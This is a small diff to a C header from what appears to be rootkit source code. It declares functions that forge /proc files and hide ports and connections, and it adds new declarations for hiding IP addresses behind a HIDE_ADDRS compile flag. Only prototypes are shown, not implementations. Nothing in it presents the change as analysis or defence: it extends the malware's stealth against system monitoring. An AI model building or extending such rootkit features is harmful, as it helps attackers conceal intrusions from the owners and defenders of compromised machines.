@@ -22,6 +22,10 @@ FILE *forge_numamaps(const char *pathname);
 
 #ifdef HIDE_PORTS
 int is_hidden_port(int port);
+#ifdef HIDE_ADDRS
+char *getanip(const char *addr);
+int is_hidden_addr(const char *addr);
+#endif
 int secret_connection(char line[]);
 int hideport_alive(void);
 FILE *forge_procnet(const char *pathname);
